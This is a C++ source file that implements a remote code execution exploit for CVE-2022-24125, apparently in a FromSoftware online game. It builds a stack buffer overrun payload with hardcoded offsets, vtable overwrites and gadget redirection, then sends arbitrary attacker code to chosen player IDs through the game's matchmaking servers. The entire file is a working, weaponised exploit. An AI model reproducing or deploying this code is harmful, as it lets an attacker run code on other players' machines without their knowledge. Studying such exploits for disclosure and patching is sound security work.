#include "Protobuf/ProtoLite.hpp"
#include "FdpClient.hpp"
#include "rce.h"

// Send the exploit to the given players through a PushRequestVisit packet via the RequestSendMessageToPlayers 
// request (CVE-2022-24125).
bool rce(const std::vector<uint8_t>& payload, const std::vector<uint32_t>& player_ids)
{
	// Offset in the exploit data at which will line up with the beginning of the DLMemoryInputSteam 
	// object on the stack during the buffer overrun. We want to overwrite the stream's vftable by 
	// overwriting the two lower bytes, leading to the first code redirection of the exploit. 
	constexpr uint64_t stream_stack_offset = sizeof(rce_header) + 0x278;

	// Offset in exploit data which will correspond to the game object whose virtual function is 
	// called in the last gadget (see rce.h) after the memcpy call. This is where we will construct 
	// a fake vftable to achieve RCE. We will setup this vftable to redirect execution to the 
	// code that suspends all threads and re-copies the payload.
	constexpr uint64_t final_obj_offset = 0x848 + 0x30; // 0x30 bytes is due to the size of spawn data

	// This the offset in exploit data where we will write the rce setup code. Very few writes are done
	// by the game there
	constexpr uint64_t setup_asm_offset = final_obj_offset - 0x200;

	// Total exploit size excluding the payload. Can essentially be considered the minimum exploit size
	// to "send" a 0 byte payload (the 8 bytes are not necessary but my payload was already assembled 
	// at 0x144786798 instead of 0x144786790)
	constexpr uint64_t exploit_size = final_obj_offset + 8;

	// Buffer which will contain the full exploit + payload. Initialized with 0x01 so that the NRSSR 
	// parser overruns the stack while copying the host name.
	std::vector<uint8_t> rce(exploit_size + payload.size(), 0x01);

	// Copy all exploit data at the correct locations in the payload buffer
	memcpy(rce.data(), rce_header, sizeof(rce_header));
	memcpy(rce.data() + setup_asm_offset, rce_suspend_threads, sizeof(rce_suspend_threads));
	memcpy(rce.data() + exploit_size, payload.data(), payload.size());

	*(uint16_t*)(rce.data() + stream_stack_offset) = 0x308B; // stream object vmt redirection

	// pointer to the "object" whose virtual method gets called by the last gadget
	*(uint64_t*)(rce.data() + final_obj_offset) = 0x144786988;
	// pointer to the "object"'s vmt. Set so that offset 0x68 is (final_obj_offset - 8)
	*(uint64_t*)(rce.data() + final_obj_offset - 16) = 0x144786990 - 0x68;	
	// Because of the above, execution will be redirected to this address. Set it to where our setup code is loaded into memory.
	*(uint64_t*)(rce.data() + final_obj_offset - 8) = 0x144786798;

	ProtoLiteMsg requestVisit;
	requestVisit.AddField(1, 951u);	// ID of a PushRequestVisit message
	requestVisit.AddField(2, 12345u); // Our "player ID" (we can write anything nonzero here)
	requestVisit.AddField(3, "0110000123456789"); // Supposed to be a Steam ID, can probably be anything
	requestVisit.AddField(4, rce);
	requestVisit.AddField(5, 4u); // Spears of The Church (could use another cov. but would change the addresses)
	requestVisit.AddField(6, 520000u); // Play area values, doesn't matter for the exploit so long as they're valid
	requestVisit.AddField(7, 520000u); // as we're sending this packet directly via RequestSendMessageToPlayers

	// Add the target players and the exploit push request to a RequestSendMessageToPlayers request
	ProtoLiteMsg sendToPlayers;
	for (int i = 0; i < player_ids.size(); i++)
		sendToPlayers.AddField(1, player_ids[i]);

	sendToPlayers.AddEmbeddedMsg(2, requestVisit);

	// Attempt to get the FDP client instance
	if (FdpClient::Instance() == NULL)
		return false;

	// Serialize the request and send it to the matchmaking servers.
	std::vector<uint8_t> request = sendToPlayers.Serialize();
	return FdpClient::Instance()->SendFrpgPacket(800, request.data(), request.size()) != 0;
}